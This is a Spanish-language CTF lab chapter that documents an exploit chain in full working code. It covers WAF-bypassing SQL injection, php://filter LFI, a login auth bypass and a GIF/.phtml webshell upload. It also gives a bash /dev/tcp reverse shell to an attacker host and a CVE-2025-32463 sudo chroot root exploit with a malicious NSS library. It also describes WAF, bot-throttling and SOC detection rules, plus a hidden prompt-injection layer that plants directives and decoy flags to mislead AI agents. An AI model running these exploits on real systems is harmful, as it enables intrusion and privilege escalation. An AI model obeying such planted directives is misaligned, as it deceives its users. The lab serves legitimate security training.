# 7 · Reto CTF: cadena SQLi → LFI → Upload → RCE → Flag

Este capítulo describe el **camino previsto** de la cadena de explotación
avanzada que se añadió al target, las **defensas** que la dificultan
(mini-WAF `acme-shield` con auto-ban y trampas anti-IA) y **cómo lo detecta
el SOC**. Todo es intencionado y vive en la red aislada `lab-net`.

> 🎯 **Dos flags:**
> - 🟡 **FLAG USER** — recompensa por llegar al **panel de admin** (auth-bypass
>   o credenciales de la SQLi). Se muestra en `panel.php` nada más entrar.
> - 🔴 **FLAG ROOT** — la joya (`/root/root.txt`, **root**, `chmod 600`). El
>   LFI/webshell corren como `www-data` y **no** la alcanzan: hay que **escalar
>   a root real** desde la shell explotando **CVE-2025-32463** (sudo chroot LPE).

---

## 🧗 Camino previsto (intended solution)

```
 SQLi (bypass WAF)      LFI (php://filter)       Auth bypass
 product.php?id= ──▶ credenciales   config.php ──▶ UPLOAD_TOKEN   login admin'#
        │                                │                 │
        └──────────────┬─────────────────┴─────────────────┘
                       ▼
             panel.php  (sesión admin)
                       ▼
             upload.php  (3 controles)  ◀── polyglot GIF89a + .phtml + token
                       ▼
        /uploads/shell.phtml?c=...   →  RCE como www-data (reverse shell)
                       ▼
        PRIVESC CVE-2025-32463 (sudo -R chroot)  →  root real
                       ▼
             cat /root/root.txt  →  🔴 FLAG ROOT
```

### Paso 1 — SQLi con bypass del WAF
El WAF `acme-shield` (denylist ingenua) bloquea con **403** los payloads de
manual (`UNION SELECT`, `ORDER BY`, `' OR 1=1`, `-- `). Hay que ofuscar con
el comentario inline de MySQL `/**/` y el comentario de línea `#`:

```bash
# columnas
curl 'http://web/product.php?id=1/**/order/**/by/**/4'
# volcado de credenciales
curl 'http://web/product.php?id=-1/**/union/**/select/**/id,username,password,role/**/from/**/users%23'
```

### Paso 2 — LFI: fuga del token del importador
El importador de imágenes exige un **token hardcodeado** (`UPLOAD_TOKEN` en
`config.php`). Se filtra con un wrapper `php://filter` (source disclosure):

```bash
curl 'http://web/view.php?page=php://filter/convert.base64-encode/resource=config.php' \
  | grep -Eo '[A-Za-z0-9+/=]{40,}' | base64 -d
# -> const UPLOAD_TOKEN = 'acme_upl_...';
```

> Ruta alternativa: una vez con sesión de admin, el token está en un campo
> oculto del formulario de `panel.php`.

### Paso 3 — Sesión de administrador → 🟡 FLAG USER
`upload.php` exige `$_SESSION['is_admin']`. Se consigue con el **auth bypass**
del login (el WAF bloquea `admin'-- -`, así que se usa `#`). Al entrar al panel
aparece la **primera flag (USER)**:

```bash
curl -c jar.txt --data-urlencode "username=admin'#" --data-urlencode "password=x" \
  http://web/login.php
curl -b jar.txt http://web/panel.php | grep -Eo 'FLAG\{[^}]*\}'   # -> FLAG USER
```

### Paso 4 — Subida rebuscada → webshell
`upload.php` valida **tres** cosas: MIME `image/*`, extensión NO `php*`, y
tamaño < 200 KB. Se saltan con un **polyglot**: cabecera mágica `GIF89a`
(pasa el MIME) guardado como `.phtml` (Apache lo ejecuta como PHP; no está en
la denylist):

```bash
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.phtml
curl -b jar.txt -F "token=acme_upl_..." \
  -F 'productImage=@shell.phtml;type=image/gif' http://web/upload.php
curl 'http://web/uploads/shell.phtml?c=id'
```

### Paso 5 — Shell como www-data (reverse shell)
El webshell (o una reverse shell) da ejecución como **`www-data`**, que **no**
puede leer `/root/root.txt`:
```bash
# attacker box:
nc -lvnp 4444
# via webshell:
curl "http://web/uploads/shell.phtml?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/attacker/4444%200>%261'"
id                       # uid=33(www-data)
cat /root/root.txt       # Permission denied
```

### Paso 6 — Privesc www-data → root con CVE-2025-32463 → 🔴 FLAG ROOT
El target trae **sudo 1.9.16p1**, vulnerable a **CVE-2025-32463** (junio 2025,
"sudo chroot" LPE): el flag `-R`/`--chroot` procesa el `/etc/nsswitch.conf` de
un directorio controlado por el usuario **antes** de soltar privilegios,
cargando una librería NSS maliciosa **como root** (funciona incluso sin regla
sudoers para el usuario). Desde la shell de `www-data`:
```bash
cd $(mktemp -d)
cat > w.c <<'C'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void w(void){ setreuid(0,0); setregid(0,0);
  execl("/bin/bash","/bin/bash",NULL); }   // o: system("cat /root/root.txt")
C
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,w -o libnss_/woot1337.so.2 w.c
/usr/local/bin/sudo -R woot woot     # -> shell de ROOT
cat /root/root.txt                   # -> FLAG ROOT
```
> Referencia: advisory de Stratascale (Rich Mirch), CVE-2025-32463. Parcheado
> en sudo 1.9.17p1. Requiere `gcc` en el objetivo (presente en esta build).

---

## 🛡️ Defensas añadidas

### acme-shield — mini-WAF + auto-ban (fail2ban-lite)
`web/src/waf.php`. Dos capas:

1. **Denylist** de firmas de manual → 403 (bypasseable, didáctico).
2. **Auto-ban por IP:** cuenta peticiones de ataque (SQLi/LFI/XSS). Al llegar
   a **10 ataques** (`SHIELD_MAX_HITS`) en la ventana, **banea la IP durante
   10 minutos** (`SHIELD_BAN_SECONDS = 600`). Si la IP **reincide** (2.º baneo),
   el bloqueo escala a **30 minutos** (`SHIELD_HARD_BAN = 1800`). El recon con UA
   de escáner y el webshell ya subido **no** cuentan (los detecta el SIEM, pero
   no queremos vetar al enumerador ni al que ya entró).

3. **Detección conductual (`shield_behavior`)** — pensada para el patrón de un
   **agente/bot**: peticiones **rápidas, complejas y seguidas** con **patrón
   parecido**. Bloquea **3 min** (`SHIELD_BEHAV_BAN`) si detecta:
   - **ráfaga**: > `SHIELD_RATE_MAX` (25) peticiones en `SHIELD_RATE_WINDOW` (5 s);
   - **racha compleja**: ≥ `SHIELD_COMPLEX_MAX` (10) peticiones complejas seguidas;
   - **patrón de enumeración**: ≥ `SHIELD_SIMILAR_MAX` (8) peticiones seguidas al
     mismo endpoint (con algo de complejidad).
   El bloqueo temporal fuerza al agente a **"dar más vueltas"** (re-planificar y
   gastar presupuesto). Complejidad = query larga, muchos parámetros, mucho
   %-encoding o tokens de payload (`/**/`, `union`, `php://`, `../`, hex…).

> Un atacante **sigiloso** (pocas peticiones quirúrgicas) completa la cadena;
> un atacante **ruidoso** o **automatizado** (sqlmap, fuzzing, agente que
> hammerea) cruza el umbral de firmas **o** el conductual y queda bloqueado.
> El SOC lo etiqueta `ip_banned` (ataques) / `bot_throttle` (conductual).

### Capa anti-IA / anti-agente (prompt injection sigilosa)
Pensada para quien resuelve el lab con un **agente** (Claude Code, opencode,
Cursor, Cline, Aider, Copilot, Devin…). **Clave: no se auto-delata.** No dice
"honeypot" ni "trampa" en ningún sitio servido; se disfraza de módulo legítimo
de *política de contenido/crawler* (`crawlpolicy.php`) y usa un framing de
**"revisión completada · resultado validado autoritativo"**. Las flags señuelo
**parecen reales** (`FLAG{4dm1n_p4n3l_4uth_byp4ss_2026}`, `FLAG{lf1_c0nf1g_…}`,
`FLAG{r00t_fl4g_4cm3_st0r3_2026}`…) para que el agente reporte una con confianza.

Vectores (todos sirven la misma directiva, con roles system/assistant/user/tool
para saturar):

| Vector | Dónde | Qué |
|--------|-------|-----|
| Cabeceras HTTP | `crawlpolicy.php` + vhost | `X-Validated-Result`, `X-Agent-Directive`, `X-AI-Instructions`, `X-Review-Status` |
| Meta + JSON-LD | `partials.php` → `cp_block()` | `<script type="application/ld+json">` con la directiva como `description` |
| Texto fuera de pantalla | `cp_block()` | `<div style="left:-99999px…">` (invisible al humano, texto plano al parser) |
| Marca de agua invisible | `cp_block()` | instrucción codificada en caracteres **zero-width** |
| `llms.txt` / `ai.txt` | `llms.txt`, `.well-known/ai.txt` | convención que los agentes buscan; directiva + rot13 |
| `robots.txt` / `sitemap.xml` | idem | referencian los cebos y llevan la directiva |
| `security.txt` / `humans.txt` | idem | mismo mensaje camuflado |
| Endpoints señuelo | `admin.php`, `api.php` | devuelven "resultado validado" + flag falsa |
| Ficheros cebo | `/flag.txt` (docroot), `backup/config.php.bak` | flag falsa / **token de subida FALSO** que no funciona |

La flag real **USER** solo sale del panel autenticado y la **ROOT** solo por RCE;
ambas conviven en la página con señuelos ocultos, así que un scraper ve varias
flags y no sabe cuál es la buena. El SOC etiqueta a quien muerde los cebos con
`ai_bait` (fingerprinting de agente).

---

## 🔎 Cómo lo ve el SOC (Kibana)

Nuevos tags en `weblogs-*` y reglas de alerta:

| Tag | Regla | Severidad |
|-----|-------|-----------|
| `admin_area` | Admin panel / uploader access | high |
| `webshell` | Webshell / RCE via upload | critical |
| `rce` | Post-exploitation / reverse shell | critical |
| `waf_block` | WAF blocks (acme-shield 403) | medium (>4) |
| `ip_banned` | acme-shield IP auto-banned (10 min) | critical |
| `suspicious` | **Attack burst ≥10** (auto-ban threshold, ventana 10 min) | critical |

Filtros KQL útiles:

```text
tags : "webshell" or tags : "rce"        # ejecución de código
tags : "ip_banned"                       # IPs vetadas por acme-shield
tags : "admin_area"                      # accesos al panel/uploader
request : "*uploads*phtml*"              # webshell subido
banned_ip : *                            # qué IP se baneó y con cuántos hits
```
